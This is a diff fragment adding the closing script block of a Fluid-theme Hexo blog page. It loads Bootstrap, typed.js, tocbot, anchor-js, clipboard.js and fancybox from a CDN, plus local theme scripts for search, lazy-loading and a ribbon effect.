+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
